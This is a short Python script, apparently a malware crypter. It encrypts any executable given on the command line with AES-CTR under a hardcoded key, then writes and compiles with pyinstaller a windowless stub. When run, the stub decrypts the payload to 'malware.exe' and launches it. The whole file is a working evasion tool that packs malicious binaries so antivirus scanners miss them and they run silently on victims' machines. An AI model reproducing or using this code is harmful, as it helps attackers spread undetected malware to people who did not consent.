import pyaes
import os
import sys

KEY = b'0123456789123456'
name = 'stub.py'

exe_path = sys.argv[1]  # Obt√©m o caminho do arquivo a partir do argumento de linha de comando

with open(exe_path, 'rb') as file:
    exe = file.read()

crypt = pyaes.AESModeOfOperationCTR(KEY).encrypt(exe)

stub = f"""
import pyaes
import subprocess

KEY = {KEY}
crypt = {crypt}

decryp = pyaes.AESModeOfOperationCTR(KEY).decrypt(crypt)
with open('malware.exe', 'wb') as file:
    file.write(decryp)

subprocess.Popen('malware.exe')
"""

with open(name, 'w') as file:
    file.write(stub)

os.system(f'pyinstaller -F -w --clean {name}')
